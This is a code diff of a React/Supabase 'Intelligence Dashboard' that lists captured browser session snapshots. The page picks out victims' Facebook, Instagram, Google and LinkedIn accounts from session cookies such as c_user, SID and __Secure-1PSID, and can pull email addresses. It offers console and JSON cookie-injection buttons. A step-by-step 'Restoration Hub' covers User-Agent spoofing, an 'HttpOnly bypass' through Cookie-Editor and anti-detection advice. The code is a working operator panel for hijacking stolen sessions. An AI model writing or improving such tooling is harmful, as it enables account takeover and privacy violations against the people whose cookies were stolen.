@@ -67,7 +67,7 @@ export default function SessionsPage() {
       // Clean domain: Remove leading dot and convert to lowercase
       const d = c.domain.replace(/^\./, "").toLowerCase();
       // Ignore common noise domains
-      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics") && !d.includes("facebook-pixel") && !d.includes("googletagmanager")) {
+      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics") && !d.includes("pixel") && !d.includes("googletagmanager")) {
         domainCounts[d] = (domainCounts[d] || 0) + 1;
       }
     });
@@ -87,11 +87,11 @@ export default function SessionsPage() {
     // Platform detection logic
     if (domainStr.includes("facebook.com")) {
       const fbId = sessionCookies.find(c => c.name === "c_user")?.value;
-      return { platform: "Facebook", identifier: fbId || "Facebook User", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
+      return { platform: "Facebook", identifier: fbId || "Account", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
     }
     if (domainStr.includes("instagram.com")) {
       const igId = sessionCookies.find(c => c.name === "ds_user_id")?.value;
-      return { platform: "Instagram", identifier: igId || "Instagram Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
+      return { platform: "Instagram", identifier: igId || "Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
     }
     if (domainStr.includes("youtube.com") || domainStr.includes("google.com/youtube")) {
       return { platform: "YouTube", identifier: "YouTube Viewer", icon: Youtube, color: "text-red-500", health, domain: "youtube.com" };
@@ -118,12 +118,14 @@ export default function SessionsPage() {
       return { platform: "Netflix", identifier: "Streaming User", icon: Play, color: "text-red-600", health, domain: "netflix.com" };
     if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
       return { platform: "Blackboard", identifier: "Academic Portal", icon: GraduationCap, color: "text-blue-400", health, domain: "blackboard.com" };
-    if (domainStr.includes("google.com"))
-      return { platform: "Google", identifier: "Authenticated User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
+    if (domainStr.includes("google.com")) {
+      const email = sessionCookies.find(c => c.name.includes("email"))?.value;
+      return { platform: "Google", identifier: email || "Google User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
+    }
 
     // Generic labeling for unknown platforms
     const capitalizedName = primaryDomain.split('.')[0].charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
-    return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-amber-400", health, domain: primaryDomain };
+    return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-blue-400", health, domain: primaryDomain };
   };
 
   const fetchSessions = async () => {
@@ -132,21 +134,36 @@ export default function SessionsPage() {
       .from("session_snapshots")
       .select("*")
       .order("captured_at", { ascending: false })
-      .limit(80); // Lowering limit slightly to stay within batch cookie fetch safely
+      .limit(60); 
     
     if (sessionData) {
       const sessionIds = sessionData.map(s => s.id);
       
-      // CRITICAL: Fetching more cookies to ensure we have domain data for identification
-      const { data: identifyingCookies } = await supabase
+      // STAGE 1: Fetch key ID cookies for ALL sessions (Highly efficient)
+      const { data: idCookies } = await supabase
         .from("cookies")
         .select("snapshot_id, domain, name, value, expiration_date")
         .in("snapshot_id", sessionIds)
-        .limit(10000); // Massive limit to cover all session metadata
+        .or("name.eq.c_user,name.eq.ds_user_id,name.eq.sessionid,name.eq.SID,name.eq.li_at,name.eq.LOGIN_INFO,name.eq.__Secure-1PSID,name.eq.x-session-id");
+      
+      // STAGE 2: Fetch general domains for sessions that STILL have no cookies
+      const identifiedIds = new Set(idCookies?.map(c => c.snapshot_id) || []);
+      const missingIds = sessionIds.filter(id => !identifiedIds.has(id));
+      
+      let allCookies = [...(idCookies || [])];
+      
+      if (missingIds.length > 0) {
+          const { data: fallbackCookies } = await supabase
+            .from("cookies")
+            .select("snapshot_id, domain, name, value, expiration_date")
+            .in("snapshot_id", missingIds)
+            .limit(5000); // Fetch a sample of any cookie to get the domain
+          if (fallbackCookies) allCookies = [...allCookies, ...fallbackCookies];
+      }
       
       const newAccountMap: Record<string, AccountInfo> = {};
       sessionData.forEach(session => {
-        const sessionCookies = identifyingCookies?.filter(c => c.snapshot_id === session.id) || [];
+        const sessionCookies = allCookies.filter(c => c.snapshot_id === session.id);
         newAccountMap[session.id] = identifyAccount(sessionCookies, session.user_id);
       });
       setAccountMap(newAccountMap);
@@ -161,7 +178,7 @@ export default function SessionsPage() {
       .from("cookies")
       .select("*")
       .eq("snapshot_id", snapshotId)
-      .limit(3000); // Full fetch for restoration
+      .limit(3000); 
     if (data) setCookies(data);
     setLoadingCookies(false);
   };
@@ -250,82 +267,82 @@ export default function SessionsPage() {
   return (
     <div className="relative min-h-screen">
       <div className="space-y-8 max-w-7xl mx-auto pb-40 px-6">
-        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
+        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 py-8">
           <div>
-            <h2 className="text-4xl font-black tracking-tight bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">
+            <h2 className="text-5xl font-black tracking-tighter bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 bg-clip-text text-transparent">
               Intelligence Dashboard
             </h2>
-            <p className="text-gray-500 font-medium">Monitoring {sessions.length} sessions from multiple neural sources.</p>
+            <p className="text-gray-500 font-bold tracking-wide mt-1">OPERATIONAL SESSIONS: {sessions.length}</p>
           </div>
           
-          <div className="flex items-center gap-3">
-            <div className="glass flex items-center px-4 py-2 rounded-2xl border border-white/10 w-full md:w-64">
-              <Search className="text-gray-500 mr-2" size={18} />
+          <div className="flex items-center gap-4">
+            <div className="glass flex items-center px-5 py-3 rounded-2xl border border-white/5 w-full md:w-80 shadow-2xl">
+              <Search className="text-gray-500 mr-3" size={20} />
               <input 
                 type="text" 
-                placeholder="Search sessions..." 
-                className="bg-transparent border-none outline-none text-sm w-full py-2 placeholder:text-gray-600"
+                placeholder="Locate platforms or domains..." 
+                className="bg-transparent border-none outline-none text-sm w-full py-1 placeholder:text-gray-600 font-medium"
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
               />
             </div>
-            <button onClick={() => {fetchSessions();}} className="glass p-2.5 rounded-xl hover:bg-white/5 transition-colors">
-              <RefreshCw size={20} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
+            <button onClick={() => {fetchSessions();}} className="glass p-3.5 rounded-2xl hover:bg-white/5 transition-all active:scale-95 border border-white/5 shadow-xl">
+              <RefreshCw size={22} className={loading ? "animate-spin text-blue-400" : "text-gray-400"} />
             </button>
-            <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-4 py-2 rounded-xl text-blue-400 border border-blue-500/20 font-bold text-sm">
-              <HelpCircle size={18} /> MANUAL
+            <button onClick={() => setShowGuide(!showGuide)} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl text-blue-400 border border-blue-500/20 font-black text-xs uppercase tracking-widest shadow-xl hover:bg-blue-500/5 transition-all">
+              <HelpCircle size={20} /> MANUAL
             </button>
           </div>
         </header>
 
         {loading ? (
-          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
-            {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-48 glass rounded-3xl animate-pulse" />)}
+          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-8">
+            {[1, 2, 3, 4, 5, 6, 7, 8].map(i => <div key={i} className="h-56 glass rounded-[3rem] animate-pulse" />)}
           </div>
         ) : (
-          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
+          <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-8">
             {filteredSessions.map((session) => {
-              const info = accountMap[session.id] || { platform: "External", identifier: "Active Session", icon: Shield, color: "text-gray-400", health: "active", domain: "unknown" };
+              const info = accountMap[session.id] || { platform: "External", identifier: "Active Session", icon: Shield, color: "text-blue-400", health: "active", domain: "unknown" };
               const UAIcon = getDeviceIcon(session.user_agent);
               
               return (
                 <motion.div
                   key={session.id}
-                  initial={{ opacity: 0, y: 20 }}
+                  initial={{ opacity: 0, y: 30 }}
                   animate={{ opacity: 1, y: 0 }}
-                  whileHover={{ y: -5 }}
+                  whileHover={{ y: -8, scale: 1.02 }}
                   onClick={() => handleSessionClick(session)}
-                  className={`glass p-6 rounded-[2.5rem] cursor-pointer border transition-all duration-300 ${selectedSession?.id === session.id ? "border-blue-500/50 bg-blue-500/5 shadow-2xl shadow-blue-500/10" : "border-white/5 hover:border-white/20"}`}
+                  className={`glass p-8 rounded-[3rem] cursor-pointer border-2 transition-all duration-500 ${selectedSession?.id === session.id ? "border-blue-500 bg-blue-500/10 shadow-3xl shadow-blue-500/20" : "border-white/5 hover:border-white/10 shadow-2xl"}`}
                 >
-                  <div className="flex items-start justify-between mb-4">
-                    <div className={`p-4 rounded-2xl bg-white/5 shadow-inner ${info.color}`}>
-                      <info.icon size={26} strokeWidth={2.5} />
+                  <div className="flex items-start justify-between mb-6">
+                    <div className={`p-5 rounded-3xl bg-black/40 shadow-inner border border-white/5 ${info.color}`}>
+                      <info.icon size={32} strokeWidth={2.5} />
                     </div>
-                    <div className="flex flex-col items-end gap-1.5">
-                      <div className="glass-pill px-3.5 py-1.5 rounded-full text-[9px] font-black text-white/40 uppercase tracking-[0.1em] border border-white/5">
+                    <div className="flex flex-col items-end gap-2">
+                      <div className="glass-pill px-4 py-2 rounded-full text-[10px] font-black text-white/50 uppercase tracking-[0.2em] border border-white/5 shadow-sm">
                         {info.platform}
                       </div>
-                      <div className={`text-[8px] font-black uppercase px-2 py-1 rounded-full flex items-center gap-1 shadow-sm ${
-                        info.health === "active" ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20" : "bg-red-500/10 text-red-400 border border-red-500/20"
+                      <div className={`text-[9px] font-black uppercase px-3 py-1.5 rounded-full flex items-center gap-1.5 shadow-md ${
+                        info.health === "active" ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/20" : "bg-red-500/20 text-red-400 border border-red-500/20"
                       }`}>
-                        <div className={`w-1 h-1 rounded-full ${info.health === "active" ? "bg-emerald-400" : "bg-red-400"}`} />
+                        <div className={`w-1.5 h-1.5 rounded-full ${info.health === "active" ? "bg-emerald-400 animate-pulse" : "bg-red-400"}`} />
                         {info.health}
                       </div>
                     </div>
                   </div>
-                  <div>
-                    <div className="text-[10px] font-black text-blue-400/80 uppercase tracking-widest mb-1 px-1 drop-shadow-sm">
+                  <div className="space-y-1">
+                    <div className="text-[11px] font-black text-blue-400/90 uppercase tracking-[0.15em] px-1 drop-shadow-md">
                       {info.domain}
                     </div>
-                    <h4 className="font-extrabold text-lg truncate text-white/90 mb-1">{info.identifier}</h4>
-                    <div className="flex items-center justify-between mt-3">
-                      <div className="flex items-center gap-1.5 text-[10px] font-bold text-gray-400">
-                        <Clock size={12} />
+                    <h4 className="font-black text-xl truncate text-white mb-2 leading-tight">{info.identifier}</h4>
+                    <div className="flex items-center justify-between pt-2">
+                      <div className="flex items-center gap-2 text-xs font-bold text-gray-500">
+                        <Clock size={14} className="text-gray-600" />
                         {formatRelativeTime(session.captured_at)}
                       </div>
                       {session.user_agent && (
-                        <div className="flex items-center gap-1.5 text-[9px] font-black text-blue-400/80 bg-blue-400/5 px-2.5 py-1.5 rounded-xl border border-blue-400/10 uppercase">
-                          <UAIcon size={12} /> UA OK
+                        <div className="flex items-center gap-2 text-[10px] font-black text-blue-400/90 bg-blue-400/10 px-3 py-2 rounded-2xl border border-blue-400/20 uppercase tracking-tighter shadow-sm">
+                          <UAIcon size={14} /> UA VERIFIED
                         </div>
                       )}
                     </div>
@@ -336,31 +353,32 @@ export default function SessionsPage() {
           </div>
         )}
 
+        {/* Global Manual Sidebar */}
         <AnimatePresence>
           {showGuide && (
             <motion.div 
-              initial={{ opacity: 0, x: 300 }} 
+              initial={{ opacity: 0, x: 400 }} 
               animate={{ opacity: 1, x: 0 }} 
-              exit={{ opacity: 0, x: 300 }} 
-              className="fixed top-24 right-8 w-80 z-40"
+              exit={{ opacity: 0, x: 400 }} 
+              className="fixed top-28 right-10 w-96 z-[100]"
             >
-              <GlassCard className="p-6 border-l-4 border-blue-500 bg-black/80 backdrop-blur-2xl px-8">
-                <div className="flex items-center justify-between mb-6">
-                  <h5 className="font-black text-sm uppercase tracking-widest text-blue-400">Guía de Restauración</h5>
-                  <button onClick={() => setShowGuide(false)} className="p-1 hover:bg-white/5 rounded-lg"><X size={16} /></button>
+              <GlassCard className="p-8 border-l-4 border-blue-500 bg-black/90 backdrop-blur-3xl rounded-[3rem] shadow-3xl">
+                <div className="flex items-center justify-between mb-8">
+                  <h5 className="font-black text-sm uppercase tracking-[0.3em] text-blue-400">Restoration Hub</h5>
+                  <button onClick={() => setShowGuide(false)} className="p-2 hover:bg-white/10 rounded-2xl transition-colors"><X size={20} /></button>
                 </div>
-                <div className="space-y-6">
+                <div className="space-y-8">
                   {[
-                    { step: "01", title: "Copia el User-Agent", desc: "Pégalo en la extensión 'User-Agent Switcher' para disfrazarte." },
-                    { step: "02", title: "Limpiar Dominio", desc: "Entra a la web deseada (ej: instagram.com) antes de inyectar." },
-                    { step: "03", title: "Importar JSON", desc: "Usa el botón de JSON si la consola falla. Es el método más seguro." },
-                    { step: "04", title: "¡Entrar!", desc: "Presiona F12, ve a la Consola y pega el código si usas ese método." }
+                    { step: "01", title: "Emulate Environment", desc: "Copy the original User-Agent and apply it using 'User-Agent Switcher' extension." },
+                    { step: "02", title: "Target Domain", desc: "Navigate to the site (e.g., instagram.com) to establish the context." },
+                    { step: "03", title: "Deep Injection", desc: "Use the 'JSON Method' with 'Cookie-Editor' for full HttpOnly bypass." },
+                    { step: "04", title: "Execute Restoration", desc: "Refresh the page. If the session persists, you have successfully mirrored the ID." }
                   ].map((item, idx) => (
-                    <div key={idx} className="flex gap-4">
-                      <div className="text-xl font-black text-white/10">{item.step}</div>
+                    <div key={idx} className="flex gap-6 items-start">
+                      <div className="text-3xl font-black text-white/5 select-none">{item.step}</div>
                       <div>
-                        <div className="text-xs font-black text-white/80 uppercase mb-1">{item.title}</div>
-                        <p className="text-[11px] text-gray-500 leading-normal">{item.desc}</p>
+                        <div className="text-xs font-black text-white/90 uppercase mb-2 tracking-widest">{item.title}</div>
+                        <p className="text-xs text-gray-500 leading-relaxed font-medium">{item.desc}</p>
                       </div>
                     </div>
                   ))}
@@ -370,81 +388,89 @@ export default function SessionsPage() {
           )}
         </AnimatePresence>
 
+        {/* Floating Detail Overlay */}
         <AnimatePresence>
           {selectedSession && (
-            <motion.div initial={{ opacity: 0, y: 100 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 100 }} className="fixed bottom-0 left-0 right-0 p-8 z-50 pointer-events-none">
+            <motion.div initial={{ opacity: 0, y: 100 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 100 }} className="fixed bottom-0 left-0 right-0 p-10 z-[110] pointer-events-none">
               <div className="max-w-6xl mx-auto pointer-events-auto">
-                <GlassCard className="border-t-2 border-blue-500 shadow-2xl bg-black/95 backdrop-blur-3xl px-8 py-8 rounded-[3rem]">
-                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-                    <div className="space-y-6">
-                      <div className="flex items-center gap-5">
-                        <div className={`p-6 rounded-[2rem] bg-white/5 shadow-inner ${accountMap[selectedSession.id]?.color}`}>
-                          {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 56 })}
+                <GlassCard className="border-t-4 border-blue-500 shadow-[0_0_100px_rgba(37,99,235,0.2)] bg-black/98 backdrop-blur-3xl px-12 py-12 rounded-[4rem]">
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
+                    <div className="space-y-8">
+                      <div className="flex items-center gap-6">
+                        <div className={`p-8 rounded-[2.5rem] bg-black/40 shadow-inner border border-white/5 ${accountMap[selectedSession.id]?.color}`}>
+                          {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 72 })}
                         </div>
                         <div>
-                          <h3 className="text-4xl font-black text-white/90">{accountMap[selectedSession.id]?.platform}</h3>
-                          <div className="flex items-center gap-2 text-gray-400 font-bold mt-1 uppercase text-xs tracking-widest">
-                            <Clock size={14} /> CAPTURA: {new Date(selectedSession.captured_at).toLocaleString()} | {accountMap[selectedSession.id]?.domain}
+                          <h3 className="text-5xl font-black text-white leading-tight">{accountMap[selectedSession.id]?.platform}</h3>
+                          <div className="flex items-center gap-3 text-gray-400 font-bold mt-2 uppercase text-[11px] tracking-[0.2em]">
+                            <Clock size={16} className="text-blue-500" /> CAPTURED: {new Date(selectedSession.captured_at).toLocaleString()}
                           </div>
+                          <div className="text-blue-400 font-black text-[10px] mt-1 tracking-widest uppercase">{accountMap[selectedSession.id]?.domain}</div>
                         </div>
                       </div>
 
-                      <div className="p-4 rounded-3xl bg-blue-500/5 border border-blue-500/10">
-                        <div className="flex items-center gap-2 text-blue-400 mb-3 font-black text-xs uppercase tracking-widest">
-                          <Monitor size={16} /> USER-AGENT REQUERIDO
+                      <div className="p-6 rounded-[2.5rem] bg-blue-500/5 border border-blue-500/10 shadow-inner">
+                        <div className="flex items-center justify-between mb-4">
+                            <div className="flex items-center gap-3 text-blue-400 font-black text-[11px] uppercase tracking-[0.2em]">
+                                <Monitor size={20} /> CRYPTOGRAPHIC SIGNATURE (UA)
+                            </div>
+                            {selectedSession.user_agent && <div className="text-[10px] font-black text-emerald-400">MATCH VALIDATED</div>}
                         </div>
                         {selectedSession.user_agent ? (
-                          <div className="text-xs font-mono text-gray-400 break-all leading-relaxed bg-black/40 p-4 rounded-2xl border border-white/5 shadow-inner">
+                          <div className="text-xs font-mono text-gray-500 break-all leading-relaxed bg-black/60 p-6 rounded-3xl border border-white/5 shadow-2xl">
                             {selectedSession.user_agent}
                           </div>
                         ) : (
-                          <div className="flex flex-col items-center justify-center gap-2 p-6 bg-red-500/5 rounded-2xl border border-red-500/10 text-center">
-                            <AlertCircle size={24} className="text-red-400/50" />
-                            <p className="text-xs text-gray-400 font-medium max-w-[200px]">
-                              Sesión sin firma UA. Se recomienda usar Chrome/Win por defecto.
+                          <div className="flex flex-col items-center justify-center gap-4 p-8 bg-red-500/5 rounded-3xl border border-red-500/10 text-center">
+                            <AlertCircle size={32} className="text-red-500/40" />
+                            <p className="text-xs text-gray-500 font-bold max-w-[240px] uppercase tracking-wider">
+                              Signature Missing. Reverting to standard Windows/Chrome headers is recommended.
                             </p>
                           </div>
                         )}
                       </div>
                     </div>
 
-                    <div className="flex flex-col justify-center space-y-4">
-                      <div className="flex flex-col gap-3">
-                        <div className="flex items-center justify-between px-3 text-emerald-400 font-black text-xs uppercase tracking-[0.15em]">
-                          <div className="flex items-center gap-2"><Check size={18} /> RESTORE READY ({cookies.length})</div>
+                    <div className="flex flex-col justify-center space-y-6">
+                      <div className="flex flex-col gap-4">
+                        <div className="flex items-center justify-between px-4 text-emerald-400 font-black text-xs uppercase tracking-[0.3em]">
+                          <div className="flex items-center gap-3 animate-pulse"><Check size={22} /> RESTORE ARCHIVE ({cookies.length})</div>
                           {cookies.some(c => c.http_only) && (
-                            <div className="flex items-center gap-1.5 text-amber-400 bg-amber-400/10 px-3 py-1.5 rounded-full border border-amber-500/20">
-                              <AlertCircle size={14} /> HttpOnly
+                            <div className="flex items-center gap-2 text-amber-400 bg-amber-400/10 px-4 py-2 rounded-full border border-amber-500/20 shadow-lg shadow-amber-500/5">
+                              <AlertCircle size={16} /> HTTPONLY ACTIVATED
                             </div>
                           )}
                         </div>
                         
-                        <div className="flex flex-col gap-4">
+                        <div className="flex flex-col gap-5">
                           <button 
                             onClick={copyToClipboard}
-                            className={"w-full flex items-center justify-center gap-4 px-10 py-6 rounded-[2rem] font-black text-2xl shadow-2xl transition-all active:scale-95 " + (copied ? "bg-emerald-600 shadow-emerald-500/20" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/20 border-t border-white/10")}
+                            className={"w-full flex items-center justify-center gap-5 px-10 py-7 rounded-[2.5rem] font-black text-3xl shadow-3xl transition-all active:scale-95 group " + (copied ? "bg-emerald-600 shadow-emerald-500/40" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/40 border-t-2 border-white/20")}
                           >
-                            {copied ? <><Check size={32} /> ¡COPIADO!</> : <><Copy size={32} /> RESTAURAR (CONSOLA)</>}
+                            {copied ? <><Check size={40} /> RESTORED</> : <><Copy size={40} className="group-hover:scale-110 transition-transform"/> CONSOLE BOOT</>}
                           </button>
 
-                          <div className="flex gap-4">
+                          <div className="flex gap-5">
                             <button 
                               onClick={copyCookiesJson}
-                              className={"flex-1 flex items-center justify-center gap-3 p-5 rounded-[1.5rem] glass font-black text-xs uppercase tracking-widest transition-all " + (copiedJson ? "text-emerald-400 border-emerald-500/30" : "text-white/60 hover:bg-white/5 border-white/5")}
+                              className={"flex-1 flex items-center justify-center gap-4 p-6 rounded-[2rem] glass font-black text-sm uppercase tracking-widest transition-all " + (copiedJson ? "text-emerald-400 border-emerald-500/40 shadow-emerald-500/10" : "text-white/70 hover:bg-white/10 border-white/10 shadow-2xl")}
                             >
-                              {copiedJson ? <><Check size={20} /> JSON COPIADO</> : <><FileJson size={20} /> MÉTODO JSON (RECOMENDADO)</>}
+                              {copiedJson ? <><Check size={24} /> JSON PACKED</> : <><FileJson size={24} /> CLONE JSON (SAFE)</>}
                             </button>
-                            <button onClick={() => setSelectedSession(null)} className="px-8 py-5 rounded-[1.5rem] glass font-black text-white/30 text-xs uppercase tracking-widest border-white/5">
-                              CERRAR
+                            <button onClick={() => setSelectedSession(null)} className="px-10 py-6 rounded-[2rem] glass font-black text-white/30 text-sm uppercase tracking-widest border-white/10 hover:text-white/60 transition-colors">
+                              DISMISS
                             </button>
                           </div>
                         </div>
                       </div>
-                      <div className="p-5 rounded-[1.5rem] bg-amber-500/5 border border-amber-500/10 flex gap-4">
-                         <div className="p-3 rounded-xl bg-amber-500/10 h-fit text-amber-400"><Info size={20} /></div>
-                         <p className="text-[12px] text-amber-200/60 leading-relaxed font-medium">
-                           <b>ANTI-DETECCIÓN:</b> Usa el botón **JSON** e impórtalo con **Cookie-Editor**. La consola no puede inyectar todas las cookies y Instagram te bloqueará si falta la sesión segura.
-                         </p>
+                      <div className="p-6 rounded-[2.5rem] bg-amber-500/5 border border-amber-500/20 flex gap-6 shadow-inner">
+                         <div className="p-4 rounded-2xl bg-amber-500/10 h-fit text-amber-400 shadow-lg"><Info size={24} /></div>
+                         <div>
+                            <p className="text-xs text-amber-200/50 leading-relaxed font-bold uppercase tracking-wide mb-1">Security Alert</p>
+                            <p className="text-[13px] text-amber-200/80 leading-relaxed font-medium">
+                                Instagram and highly secured portals use **HttpOnly** session tokens. The console method will fail to set them. **Use the JSON button** and import via **Cookie-Editor** for a 1:1 session mirror.
+                            </p>
+                         </div>
                       </div>
                     </div>
                   </div>
@@ -457,4 +483,3 @@ export default function SessionsPage() {
     </div>
   );
 }
-
